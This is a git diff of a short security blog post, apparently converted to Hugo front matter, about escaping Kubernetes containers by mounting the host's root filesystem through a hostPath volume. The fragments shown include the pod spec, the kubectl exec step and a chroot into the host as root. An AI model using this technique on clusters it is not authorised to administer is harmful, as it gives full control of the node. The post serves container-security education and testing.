@@ -1,7 +1,10 @@
-# HostPath
-Abusing HostPath to escape containers.
-
----
++++
+date = '2021-01-29T22:10:24-05:00'
+draft = false
+title = 'HostPath'
+tags = ['kubernetes', 'containers', 'security']
+summary = 'Abusing HostPath to escape containers.'
++++
 
 ## Mounting Root Volumes Inside Containers
 
@@ -28,7 +31,7 @@ dev    home   lib    mnt    proc   run    srv    tmp    var
 groups: cannot find name for group ID 11
 To run a command as administrator (user "root"), use "sudo <command>".
 See "man sudo_root" for details.
-root@3396f9188944:/# 
+root@3396f9188944:/#
 ```
 Show release information has changed to Ubuntu (WSL)
 ```
@@ -72,7 +75,7 @@ spec:
       mountPath: "/host"
   volumes:
   - name: root
-    hostPath: 
+    hostPath:
       path: "/"
 ```
 Exec into pod to see mounted host directory just like docker
@@ -82,7 +85,7 @@ pod/noderoot created
 
 $ kubectl exec -it pod/noderoot -- /bin/bash
 bash-5.0# chroot /host bash
-[root@noderoot /]# 
+[root@noderoot /]#
 ```
 
 `chroot` onto the host
